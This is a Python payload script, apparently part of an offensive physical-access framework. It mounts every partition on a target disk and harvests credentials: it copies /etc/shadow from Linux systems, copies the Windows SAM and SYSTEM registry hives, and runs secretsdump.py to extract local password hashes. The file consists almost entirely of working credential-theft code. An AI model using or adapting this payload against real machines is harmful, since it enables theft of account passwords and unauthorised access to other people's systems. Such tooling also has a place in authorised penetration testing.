#!/usr/bin/python3
"""
Account_hashes payload
"""
from snr.core.payload import data_dir, entry_point, storage
from snr.core.util import common_utils, programs

PASSPHRASES = "@PASSPHRASES@"

SecretsDumpPy = programs.program_wrapper_factory("secretsdump.py")


@entry_point.entry_point
def main(block_info: storage.BlocksType, *_) -> None:
    for part in storage.query_all_partitions(block_info):
        with storage.mount_partition(part, PASSPHRASES) as mounted_part:
            part_info = storage.query_partition_info_by_path(part, block_info)
            assert part_info is not None
            part_data = data_dir.wrap_data_path_for_block(part_info)
            # Try to see if we are dealing with any sort of Linux
            if mounted_part.is_linux():
                # It must be linux or at least it uses shadow, that's all we care about
                part_data.copy(mounted_part.join("etc/shadow"), "hashes")
            elif mounted_part.is_windows():
                # First, copy the SAM and SYSTEM so if we failed to
                # extract for whatever reason, not all hope would be lost
                part_data.copy(mounted_part.join(
                    "Windows/System32/Config/SAM"), "SAM")
                part_data.copy(mounted_part.join(
                    "Windows/System32/Config/SYSTEM"), "SYSTEM")
                secrets_dump_py = SecretsDumpPy(stdout=programs.PIPE)
                errorcode = secrets_dump_py.invoke_and_wait(
                    None, "-sam", part_data.join("SAM"), "-system", part_data.join("SYSTEM"), "LOCAL")
                if errorcode != 0:
                    common_utils.print_warning(
                        "Extracting hash information failed! SAM and SYSTEM are already copied")
            else:
                common_utils.print_warning("Unknown operating system!")

if __name__ == "__main__":
    main()
